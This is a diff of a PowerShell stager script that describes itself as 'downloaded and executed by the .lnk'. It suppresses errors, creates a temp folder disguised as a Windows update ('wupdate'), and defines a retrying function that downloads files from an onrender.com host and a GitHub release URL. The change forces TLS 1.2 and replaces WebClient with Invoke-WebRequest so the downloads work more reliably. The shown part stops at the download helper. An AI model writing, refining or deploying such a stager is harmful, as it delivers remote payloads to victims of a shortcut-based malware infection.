@@ -1,19 +1,17 @@
 ﻿# Stage script — downloaded and executed by the .lnk
 $ErrorActionPreference = 'SilentlyContinue'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $base = 'https://rankaksks.onrender.com'
 $ghBase = 'https://github.com/sandyjack1997/rankaksks/releases/download/v1.0'
 $tmp = "$env:TEMP\wupdate-$(Get-Random)"
 
 New-Item -ItemType Directory -Path $tmp -Force | Out-Null
 
-# Helper: download with retries and redirect support
+# Helper: download with retries
 function Download($url, $out) {
     for ($i = 0; $i -lt 3; $i++) {
         try {
-            # Use .NET WebClient which handles GitHub redirects properly
-            $wc = New-Object System.Net.WebClient
-            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-            $wc.DownloadFile($url, $out)
+            Invoke-WebRequest $url -OutFile $out -UseBasicParsing -TimeoutSec 300
             if ((Test-Path $out) -and (Get-Item $out).Length -gt 0) { return $true }
         } catch {}
         Start-Sleep -Seconds 5
